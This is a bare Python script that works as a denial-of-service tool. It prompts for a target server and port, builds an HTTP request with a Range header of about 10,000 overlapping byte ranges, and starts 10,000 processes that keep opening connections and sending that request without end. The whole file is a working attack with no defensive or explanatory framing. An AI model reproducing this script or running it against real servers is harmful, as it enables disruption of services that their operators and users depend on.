import socket, time, multiprocessing
target_host = input("Please enter server name/IP:")
target_port = int(input("Port:"))
cliss=[]
rang = "0-1"
for ii in range(0,10001):
  rang = str(rang)+",5-"+str(ii)
request = """GET / HTTP/1.1\r
Range:bytes="""+rang+"""\r
Keep-Alive: timeout=500, max=1000\r
Host:"""+target_host+"""\r\n\r\n"""
def con():
  clis=[]
  a=0
  while True:
    a+=1
    try:
      clis.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
      clis[-1].settimeout(2)
      clis[-1].connect((target_host,target_port))  
      clis[-1].send(request.encode())
    except:
      pass
    if a%20==0:
      for x in clis:
        try:
          x.recv(1)
        except:
          pass
m=0
ths=[]
if __name__ == '__main__':
  for x in range(0,10000):
    ths.append(multiprocessing.Process(target=con))
    ths[-1].start()
